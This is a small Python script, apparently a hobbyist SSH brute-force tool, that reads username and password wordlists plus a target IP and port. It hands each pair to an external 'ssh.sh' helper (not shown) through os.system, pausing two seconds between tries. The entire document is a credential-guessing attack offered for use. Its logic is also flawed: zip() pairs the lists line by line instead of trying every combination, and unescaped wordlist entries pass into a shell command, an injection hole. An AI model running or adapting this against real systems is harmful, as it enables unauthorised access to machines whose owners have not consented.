#!/bin/python3

import time
import os

print( """
   __________ __        ___           __      ____
  / __/ __/ // / ____  / _ )______ __/ /____ / __/__  ___________
 _\ \_\ \/ _  / /___/ / _  / __/ // / __/ -_) _// _ \/ __/ __/ -_)
/___/___/_//_/       /____/_/  \_,_/\__/\__/_/  \___/_/  \__/\__/

by Anuj Dubey
aka 40X76
""")

userList=input("[*] user-name wordlist: ") 
passwdList=input("[*] password wordlist: ")
portNumber=input("[*] ssh port number: ")
ipAddress=input("[*] ip-address of target machine: ")

USER=open(userList, 'r')
PASSWD=open(passwdList, 'r')


for user,passwd in zip(USER.readlines(), PASSWD.readlines()):
    command ='./ssh.sh '+user.strip()+' '+passwd.strip()+' '+str(ipAddress)+' '+str(portNumber)
    os.system(command)
    time.sleep(2)

